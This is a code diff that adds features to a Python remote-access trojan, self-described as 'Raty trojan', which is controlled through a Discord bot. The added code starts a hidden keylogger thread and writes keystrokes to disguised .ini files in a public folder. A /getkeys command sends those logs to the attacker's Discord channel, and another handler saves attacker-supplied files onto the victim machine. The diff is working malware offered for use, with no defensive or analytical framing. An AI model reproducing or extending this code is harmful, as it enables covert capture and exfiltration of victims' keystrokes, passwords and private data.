@@ -23,6 +23,9 @@ import ctypes
 import wget
 import sys
 import multiprocessing
+from pynput.keyboard import Key, Listener
+from datetime import datetime
+import threading
 
 
 
@@ -52,8 +55,29 @@ def get_cpu_type():
     cpus = root_winmgmts.ExecQuery("Select * from Win32_Processor")
     return cpus
 
+def on_press(key):
+      now = datetime.now()
+      current_time = now.strftime("%H:%M:%S")
+      today = datetime.today()
+      current_day = today.strftime("%D/%m/%Y")
+      with open("C:\\Users\\Public\\downpress.ini", "a") as file:
+            file.write(f"[{current_time}at{current_time}][PRESSED] - Keyboard {key}\n")
+      with open("C:\\Users\\Public\\regedit.ini", "a") as file:
+            file.write(f"[{current_time}at{current_time}][PRESSED] - Keyboard {key}\n")
 
+def on_release(key):
+      now = datetime.now()
+      current_time = now.strftime("%H:%M:%S")
+      today = datetime.today()
+      current_day = today.strftime("%D/%m/%Y")
+      with open("C:\\Users\\Public\\uppress.ini", "a") as file:
+            file.write(f"[{current_time}at{current_time}][RELEASED] - Keyboard {key}\n")
+      with open("C:\\Users\\Public\\regedit.ini", "a") as file:
+            file.write(f"[{current_time}at{current_time}][RELEASED] - Keyboard {key}\n")
 
+def keyloggerf():
+      with Listener(on_press=on_press, on_release=on_release) as listener:
+            listener.join()
 
 # Declaring global variables to avoid errors and simplify the overall code
 #                 <[Declaring Global Variables]>
@@ -67,25 +91,49 @@ url = ""
 
 
 
-
 # Create a file called token.txt with in the same directory as the script, with the token inside it - this program uses an integration bot to access the hacker's Discord control server. It is very easy to setup a BOT, here is a tutorial on how to do it: https://www.youtube.com/watch?v=nW8c7vT6Hl4&ab_channel=Lucas
 #                                                                                                                                   <[Discord API Bot Token]> 
-
-try:  
-      with open("token.txt", "r") as tokenfile:
-            token = tokenfile.read()
-            if token == "":
-                  Mbox('API Token not found', 'Please edit the token.txt file with your Discord Bot API Token', 1)
-                  stop = True
+def get_token():
+      try:  
+            with open("token.txt", "r") as tokenfile:
+                  token = tokenfile.read()
+                  if token == "":
+                        Mbox('API Token not found', 'Please edit the token.txt file with your Discord Bot API Token', 1)
+                        stop = True
+                        sys.exit()
+                  return token
+      except:
+            if stop == False:
+                  Mbox('API Token not found', 'Create token.txt in the same directory with Discord Bot API token inside', 1)
                   sys.exit()
-except:
-      if stop == False:
-            Mbox('API Token not found', 'Create token.txt in the same directory with Discord Bot API token inside', 1)
             sys.exit()
-      sys.exit()
+
+#token = <str>
+token = get_token()
 
 
 
+# Create a file called mcid.txt with in the same directory as the script, with the main channel id inside it
+#                                             <[Discord Main Channel ID]> 
+
+def get_mid():
+      try:  
+            with open("token.txt", "r") as tokenfile:
+                  token = tokenfile.read()
+                  if token == "":
+                        Mbox('Main channel ID not found', 'Please edit the mcid.txt file with your Discord Main Channel ID inside', 1)
+                        stop = True
+                        sys.exit()
+                  return token
+      except:
+            if stop == False:
+                  Mbox('Main channel ID not found', 'Create mcid.txt in the same directory with Discord Main Channel ID inside', 1)
+                  sys.exit()
+            sys.exit()
+
+
+#main_channel_id = <integer>
+main_channel_id = get_mid()
 
 
 # Contains the interaction methods with the Discord Server.
@@ -107,8 +155,6 @@ async def on_ready():
       #                                                           <[Connection Notification]>
 
       global sch, cid, cname
-      os.system("cls")
-      print(colored("Raty trojan online!", 'green'))
 
 
 
@@ -173,7 +219,12 @@ async def on_ready():
             cname = str(getpass.getuser()) + "´" + str(cid)
             sch = discord.utils.get(client.guilds[0].channels, name=cname)
             await sch.send(embed=embed)
-            
+      keylogger = threading.Thread(target=keyloggerf)
+      keylogger.start()
+      os.system("cls")
+      print(colored("Raty trojan online!", 'green'))
+      sch = discord.utils.get(client.guilds[0].channels, name=cname)
+      #await sch.send("<@811345640223014963>")
 
 # When a message is received
 @client.event
@@ -186,14 +237,41 @@ async def on_message(message):
 
       global cname, secondmessage, url, path
       sch = discord.utils.get(client.guilds[0].channels, name=cname)
-      main_channel = client.get_channel(811346666879713281)
+      main_channel = client.get_channel(main_channel_id)
 
       if message.channel == sch or message.channel == main_channel:
+            
+            if message.attachments != [] and message.author.mention != "<@811345640223014963>":
+                  try:
+                        await message.attachments[0].save(fp=message.content)
+                        embed = discord.Embed(title="Downloading file", description=f"Downloading file requested on machine with ID {cid}", color=discord.Color.green())
+                        embed.add_field(name="Save Location", value=message.content, inline=False)
+                        await message.channel.send(embed=embed)
+                  except:
+                        embed = discord.Embed(title="Error", description=f"Error when downloading file on machine with ID {cid}", color=discord.Color.red())
+                        await message.channel.send(embed=embed)
+
+
+            elif message.content.startswith("/getkeys"):
+
+                  if message.content.endswith("down"):
+                        with open('C:\\Users\\Public\\downpress.ini', "rb") as file:
+                              await message.channel.send(file=discord.File(file, "keysdown.txt"))
+
+                  elif message.content.endswith("up"):
+                        with open('C:\\Users\\Public\\uppress.ini', "rb") as file:
+                              await message.channel.send(file=discord.File(file, "keysup.txt"))
+
+                  else:
+                        with open('C:\\Users\\Public\\regedit.ini', "rb") as file:
+                              await message.channel.send(file=discord.File(file, "key_logger.txt"))                        
+
+
 
             #This command downloads a specific file. Usage: 1st message- /download <url> 2nd message - <file save path>
             #              <[Adding Hacker-available command - Feature currently in focused development]>
 
-            if f"/download" in message.content[0:10] or secondmessage == True:
+            elif f"/download" in message.content[0:10] or secondmessage == True:
                   if message.content.replace(" ", "") == "/download":
                         embed = discord.Embed(title=f"Download command help", description=f'Help to /download command\n\nSend 2 messages:\n⠀⠀⠀⠀Message 1: download url\n⠀⠀⠀⠀Message 2: file save location\n\nTo cancel the operation at any message, write "cancel"', color=discord.Color.gold())
                         await message.channel.send(embed=embed)
